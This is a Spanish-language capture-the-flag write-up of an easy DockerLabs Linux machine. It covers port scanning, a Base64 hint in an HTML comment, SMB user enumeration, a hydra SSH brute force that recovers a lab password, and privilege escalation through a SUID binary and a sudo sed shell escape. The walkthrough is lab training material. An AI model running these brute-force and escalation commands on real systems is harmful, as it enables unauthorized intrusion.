Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #smb #base64 #brute-force #suid-abuse

![](assets/Pasted%20image%2020251126163705.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
----------------------------------------------------
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=3.44 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.437/3.437/3.437/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -Pn -n -sS -vvv 172.17.0.2
--------------------------------------------
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 46:BB:E8:E3:C2:1B (Unknown)
```

- Puertos 22, 80, 139 y 445 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,80,139,445 -sV -sC -Pn -n -sS 172.17.0.2 -oN target
--------------------------------------------------------------------------
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 a1:bc:79:1a:34:68:43:d5:f4:d8:65:76:4e:b4:6d:b1 (DSA)
|   2048 38:68:b6:3b:a3:b2:c9:39:a3:d5:f9:97:a9:5f:b3:ab (RSA)
|   256 d2:e2:87:58:d0:20:9b:d3:fe:f8:79:e3:23:4b:df:ee (ECDSA)
|_  256 b7:38:8d:32:93:ec:4f:11:17:9d:86:3c:df:53:67:9a (ED25519)
80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Andys's House
|_http-server-header: Apache/2.4.7 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: PARADISE)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: PARADISE)
MAC Address: 46:BB:E8:E3:C2:1B (Unknown)
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: 574145c6f7fc
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: 574145c6f7fc
|_  System time: 2025-11-26T21:23:07+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-26T21:23:08
|_  start_date: N/A
```

- Puerto 22 SSH OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
- Puerto 80 HTTP Apache httpd 2.4.7 (Ubuntu)
- Puertos 139 y 445 SMB Samba smbd 4.3.11-Ubuntu

## Enumeración

### Puerto 80 HTTP

La página principal muestra un sitio web para reservaciones llamado "Andy's House".

![](assets/Pasted%20image%2020251126152633.png)

El botón "Go to paradise" redirige a `/galery.html`.

**Página /galery.html**

La página muestra una galería de imágenes. Inspeccionando el código fuente encuentro un comentario codificado en Base64.

```html
<!-- ZXN0b2VzdW5zZWNyZXRvCg== -->
```

Decodifico el comentario.

```bash
> echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d; echo
estoesunsecreto
```

También noto que todas las imágenes se cargan desde el directorio `/img`.

```html
<div class="gallery-item">
   <img src="img/image7.jpg" alt="Image 6">
</div>
```

Pruebo acceder al directorio usando el mensaje decodificado: `http://172.17.0.2/estoesunsecreto/`

![](assets/Pasted%20image%2020251126160235.png)

- Encuentro un archivo llamado `mensaje_para_lucas`

### Puertos 139 y 445 SMB

**Nota:** Esta enumeración SMB es un paso adicional didáctico y no es necesaria para la explotación.

Enumero recursos compartidos con sesiones nulas, pero no encuentro nada accesible.

```bash
nxc smb 172.17.0.2 --shared -u '' -p ''
```

Utilizo `enum4linux` para enumerar usuarios del servicio SMB.

```bash
> enum4linux 172.17.0.2 -U
-------------------------------------------------------------------------------
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\andy (Local User)
S-1-22-1-1001 Unix User\lucas (Local User)
```

- Usuarios encontrados: `andy` y `lucas`

## Explotación

### Brute Force SSH

El mensaje encontrado anteriormente indica que la contraseña de `lucas` es débil y puede ser encontrada por fuerza bruta. Realizo un ataque de fuerza bruta al servicio SSH.

```bash
> hydra -l "lucas" -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 15
[22][ssh] host: 172.17.0.2   login: lucas   password: chocolate
```

- Credenciales encontradas: `lucas:chocolate`

Me conecto al sistema mediante SSH.

```bash
> ssh lucas@172.17.0.2
lucas@172.17.0.2's password: chocolate
$ whoami
lucas
$ id
uid=1001(lucas) gid=1001(lucas) groups=1001(lucas)
```

## Escalada de Privilegios

### Búsqueda de Binarios SUID

Busco binarios con el bit SUID activado.

```bash
lucas@574145c6f7fc:~$ find / -perm -4000 2>/dev/null
-------------------------------------------------------
/usr/local/bin/privileged_exec
/usr/local/bin/backup.sh
```

- Encuentro dos binarios: `privileged_exec` y `backup.sh`

Inspecciono y ejecuto `privileged_exec`.

```bash
lucas@574145c6f7fc:/tmp$ /usr/local/bin/privileged_exec
Running with effective UID: 0
root@574145c6f7fc:/tmp# whoami
root
root@574145c6f7fc:/tmp# id  
uid=0(root) gid=1001(lucas) groups=0(root),1001(lucas)
```

El binario `privileged_exec` literalmente escalo privilegios por mi jeje.

**Escalada Alternativa mediante sed**

_Esto solo es un paso extra, didactico pero no es necesario para migrar a root._

También es posible migrar al usuario `andy` abusando del binario `sed` con privilegios sudo.

```bash
> sudo -l
(andy) NOPASSWD: /bin/sed
```

Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/sed/) para encontrar formas de abusar de `sed`.

```bash
lucas@574145c6f7fc:/tmp > sudo -u andy /bin/sed -n '1e exec sh 1>&0' /etc/hosts
$ whoami
andy
$ id
uid=1000(andy) gid=1000(andy) groups=1000(andy)
```

***PWNED***
